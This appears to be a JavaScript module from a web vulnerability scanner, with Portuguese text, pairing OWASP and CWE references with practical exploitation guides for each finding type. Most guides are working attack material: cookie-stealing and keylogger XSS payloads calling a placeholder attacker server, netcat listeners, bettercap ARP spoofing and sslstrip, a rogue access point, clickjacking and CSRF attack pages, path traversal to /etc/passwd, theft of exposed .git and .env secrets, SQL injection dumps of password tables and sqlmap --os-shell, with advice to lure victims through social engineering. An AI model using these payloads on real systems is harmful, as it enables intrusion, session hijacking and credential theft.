// Referências para leitura aprofundada + guias de exploração prática
export const REFS = {
  hsts: { label: 'OWASP — HTTP Strict Transport Security', url: 'https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html' },
  csp: { label: 'OWASP — Content Security Policy', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html' },
  clickjacking: { label: 'OWASP — Clickjacking Defense', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html' },
  mimeSniffing: { label: 'OWASP Secure Headers Project', url: 'https://owasp.org/www-project-secure-headers/' },
  referrer: { label: 'OWASP Secure Headers Project', url: 'https://owasp.org/www-project-secure-headers/' },
  session: { label: 'OWASP — Session Management', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html' },
  csrf: { label: 'OWASP — CSRF Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html' },
  infoDisclosure: { label: 'CWE-200 — Exposure of Sensitive Information', url: 'https://cwe.mitre.org/data/definitions/200.html' },
  fileExposure: { label: 'CWE-538 — File and Directory Information Exposure', url: 'https://cwe.mitre.org/data/definitions/538.html' },
  transportSec: { label: 'CWE-319 — Cleartext Transmission of Sensitive Information', url: 'https://cwe.mitre.org/data/definitions/319.html' },
  tls: { label: 'OWASP — Transport Layer Security', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html' },
  xss: { label: 'OWASP — XSS Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
  sqli: { label: 'OWASP — SQL Injection Prevention', url: 'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html' },
  cors: { label: 'OWASP — Cross-Origin Resource Sharing', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Origin_Resource_Sharing_Cheat_Sheet.html' },
};

// Guias de exploração prática para cada tipo de vulnerabilidade
export const EXPLOITATION = {
  hsts: `**Como explorar a ausência de HSTS:**
1. Estabeleça um MITM entre a vítima e o servidor (ex.: ARP spoofing na mesma rede, rogue Wi-Fi).
2. Quando o navegador da vítima fizer a primeira requisição HTTP (antes do redirecionamento para HTTPS), intercepte-a.
3. Use tools como sslstrip ou bettercap para fazer downgrade da conexão para HTTP puro.
   bettercap -eval "set arp.spoof.targets <IP_ALVO>; arp.spoof on; set http.proxy.sslstrip true; http.proxy on"
4. Uma vez em HTTP, você pode capturar cookies de sessão (se não tiverem flag Secure), credenciais e modificar respostas (injetar scripts maliciosos).
5. Ferramentas: bettercap, sslstrip, mitmproxy, ettercap.`,

  csp: `**Como explorar a ausência de CSP:**
1. Encontre um ponto de XSS refletido ou armazenado no alvo (use o teste ativo do VulnScan).
2. Crie um payload que exfiltre dados do usuário:
   <script>fetch('https://SEU-SERVER/steal?c='+document.cookie)</script>
3. Sem CSP, esse script será executado sem restrições — o navegador não bloqueará a requisição externa.
4. Hospede um listener para capturar os dados:
   nc -lvnp 80
5. Monte um cenário de engenharia social: envie o link malicioso para a vítima testar.`,

  clickjacking: `**Como explorar a ausência de X-Frame-Options:**
1. Crie uma página HTML com um iframe apontando para o alvo:
   <html>
   <body style="opacity:0.5;">
     <iframe src="https://ALVO.COM/acao-sensivel" style="width:800px;height:600px;position:absolute;top:-50px;left:-100px;"></iframe>
     <button style="position:absolute;top:200px;left:300px;z-index:999;">CLIQUE AQUI PARA GANHAR</button>
   </body>
   </html>
2. Alinhe o botão sobre uma ação crítica do site alvo (ex.: "Excluir conta", "Postar como usuário").
3. Hospede a página e envie o link para a vítima.
4. Se a vítima estiver logada no alvo, o clique executará a ação sem que ela perceba.
5. Ferramentas: browser's dev tools para posicionamento, ngrok para expor localhost.`,

  mimeSniffing: `**Como explorar ausência de X-Content-Type-Options:**
1. Encontre um ponto de upload de arquivos ou reflection de conteúdo controlável.
2. Faça upload de um arquivo com extensão .txt ou .jpg mas com conteúdo HTML/JavaScript malicioso.
3. Se o servidor servir com Content-Type: text/plain, navegadores SEM X-Content-Type-Options podem executar o conteúdo como HTML (MIME sniffing).
4. Exemplo: servidor permite upload de "avatar.jpg" mas você envia:
   <script>document.location='https://SEU-SERVER/?'+document.cookie</script>
5. Ao acessar a URL do arquivo, o navegador renderiza como HTML e executa o script.`,

  referrer: `**Como explorar ausência de Referrer-Policy:**
1. Identifique um endpoint sensível no alvo que processa dados pessoais ou tokens (ex.: /reset-password?token=abc123).
2. Coloque um link externo (de seu domínio) em algum lugar acessível (comentário, perfil, issue tracker).
3. Quando o usuário logado clicar no link, o header Referer enviará a URL completa incluindo parâmetros sensíveis.
4. Capture os Referers no seu servidor:
   python3 -m http.server 80
5. Use os tokens vazados para sequestrar a ação (ex.: resetar senha da vítima).`,

  session: `**Como explorar cookies sem flags de segurança:**

Cookie sem Secure:
1. Faça um ataque MITM (mesma rede Wi-Fi, ARP spoofing) e capture tráfego HTTP.
2. O cookie será enviado em texto claro mesmo que o resto da página seja HTTPS.
   tshark -i eth0 -Y "http.cookie" -T fields -e http.cookie

Cookie sem HttpOnly:
1. Encontre um XSS no domínio (veja o guia de XSS abaixo).
2. Use payload para ler cookies:
   <script>fetch('https://SEU-SERVER/?'+document.cookie)</script>
3. O cookie de sessão será exfiltrável pois está acessível via JavaScript.

SameSite=None sem Secure:
1. Crie um site malicioso que faça requisições cross-site ao alvo.
2. Se SameSite=None (sem Secure), o cookie será enviado em requisições cross-site via HTTP, permitindo CSRF em conexões não HTTPS.`,

  csrf: `**Como explorar formulário POST sem token CSRF:**
1. Crie uma página HTML que automaticamente submeta o formulário:
   <html>
   <body onload="document.forms[0].submit()">
     <form action="https://ALVO.COM/alterar-email" method="POST">
       <input name="email" value="atacante@dominio.com">
     </form>
   </body>
   </html>
2. Hospede a página e envie o link para a vítima logada.
3. Se a vítima clicar, a ação (alteração de email, transferência, etc.) será executada sem consentimento.
4. Para formulários mais complexos, identifique todos os parâmetros necessários inspecionando o HTML original.
5. Ferramentas: Burp Suite (gera PoC CSRF automaticamente em Engagement Tools > Generate CSRF PoC).`,

  infoDisclosure: `**Como explorar vazamento de informação em headers:**
1. Identifique versões exatas de servidor/framework (ex.: "Apache/2.4.49", "Express").
2. Pesquise por CVEs específicas da versão:
   curl -v "http://ALVO/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"
3. Use searchsploit no Kali para exploits disponíveis:
   searchsploit apache 2.4.49
   searchsploit nginx
   searchsploit express
4. Vazamento de "X-Powered-By: ASP.NET, PHP/8.1" direciona seu approach de ataque e payloads específicos.`,

  fileExposure: `**Como explorar caminhos sensíveis expostos:**

.git exposto:
1. Use git-dumper para baixar o repositório inteiro:
   git clone https://github.com/arthaud/git-dumper.git
   ./git_dumper.py http://ALVO/.git/ ~/repo-clonado/
   cd ~/repo-clonado && git log --all --oneline
2. Analise o histórico do git por senhas, tokens, chaves API:
   git grep -i "password|secret|token|api_key" $(git rev-list --all)

.env exposto:
1. Simplesmente acesse no navegador ou via curl:
   curl http://ALVO/.env
2. Procure por DB_PASSWORD, API_KEY, AWS_SECRET_KEY, JWT_SECRET.
3. Use essas credenciais para acessar bancos de dados, serviços cloud, ou forjar tokens JWT.

Backups (.bak, .old, ~):
1. Baixe e analise arquivos de backup:
   wget http://ALVO/database.sql.bak
   cat database.sql.bak | grep -i "password|hash|admin"`,

  transportSec: `**Como explorar ausência de HTTPS:**
1. Na mesma rede local, use ARP spoofing + MITM:
   bettercap -eval "set arp.spoof.targets <IP_VITIMA>; arp.spoof on; net.sniff on"
2. Todo o tráfego HTTP será visível em texto claro — credenciais, cookies, tokens.
3. Em Wi-Fi público, configure um rogue access point com airbase-ng:
   airbase-ng -e "WiFi-Gratis" wlan0
4. Ferramentas: Wireshark, tcpdump, bettercap, airgeddon.`,

  tls: `**Como explorar TLS fraco ou certificado expirado:**

TLS 1.0/1.1 (POODLE, BEAST):
1. Force o downgrade do protocolo:
   openssl s_client -connect ALVO:443 -tls1
2. Use ataques POODLE (CVE-2014-3566) para decriptar dados de sessão.
3. Ferramentas: testssl.sh para análise completa:
   testssl.sh --full https://ALVO

Certificado expirado:
1. Verifique se o certificado foi revogado (CRL/OCSP).
2. Use o cert para tentar identificar subdomínios:
   echo | openssl s_client -connect ALVO:443 2>/dev/null | openssl x509 -text | grep -i "DNS:"`,

  xss: `**Como explorar XSS refletido:**
1. Confirme o reflexo do payload (já detectado pelo scanner).
2. Escale o ataque com payloads mais agressivos:

   Roubo de cookies (se HttpOnly não estiver presente):
   <script>new Image().src='https://SEU-SERVER/steal?c='+document.cookie</script>

   Keylogger:
   <script>
   document.onkeypress=function(e){new Image().src='https://SEU-SERVER/k?k='+e.key}
   </script>

   Redirecionamento para phishing:
   <script>location='https://SEU-SERVER/fake-login?r='+location.href</script>

3. Configure um listener:
   nc -lnvp 80

4. Encurte o link malicioso (ex.: bit.ly) e distribua via engenharia social.`,

  sqli: `**Como explorar SQL Injection:**

Confirmação manual (se o scanner detectou):
1. Teste diferentes variações:
   curl "http://ALVO/pagina?id=1'--"
   curl "http://ALVO/pagina?id=1'OR'1'='1"
   curl "http://ALVO/pagina?id=1 UNION SELECT 1,2,3,4--"

Extração de dados (técnica UNION):
1. Determine o número de colunas:
   curl "http://ALVO/pagina?id=1 ORDER BY 1--"
2. Identifique colunas visíveis:
   curl "http://ALVO/pagina?id=NULL UNION SELECT 1,2,3,4--"
3. Extraia informações do banco (MySQL):
   curl "http://ALVO/pagina?id=NULL UNION SELECT 1,database(),user(),version(),4--"
4. Liste tabelas:
   curl "http://ALVO/pagina?id=NULL UNION SELECT 1,group_concat(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--"
5. Dump de dados:
   curl "http://ALVO/pagina?id=NULL UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users--"

Ferramentas automatizadas:
   sqlmap -u "http://ALVO/pagina?id=1" --batch --dbs
   sqlmap -u "http://ALVO/pagina?id=1" -D banco -T usuarios --dump
   sqlmap -u "http://ALVO/pagina?id=1" --os-shell`,

  cors: `**Como explorar CORS mal configurado:**

CORS com Access-Control-Allow-Origin: * + Credentials: true:
1. Crie uma página HTML que faça fetch para o alvo:
   <html>
   <script>
   fetch('https://ALVO.COM/dados-sensiveis', { credentials: 'include' })
     .then(r => r.text())
     .then(d => { location='https://SEU-SERVER/leak?'+btoa(d); })
   </script>
   </html>
2. Hospede a página e envie para a vítima logada no alvo.
3. A vítima não precisa clicar em nada — o script executa automaticamente.
4. Os dados autenticados do alvo vazam para seu servidor.

CORS com reflexão de origem (Origin refletida):
1. Mesma técnica, mas envie um Origin arbitrário personalizado na requisição.
2. Se o servidor refletir seu Origin sem validação, o ataque funciona igual.
3. Ferramentas: Burp Suite Repeater para testar manualmente variações de Origin.`,
};

export function makeResult(severity, category, title, description, recommendation, refKey, exploitKey) {
  return {
    severity,
    category,
    title,
    description,
    recommendation,
    reference: refKey ? REFS[refKey] ?? null : null,
    exploitation: exploitKey ? EXPLOITATION[exploitKey] ?? null : null,
  };
}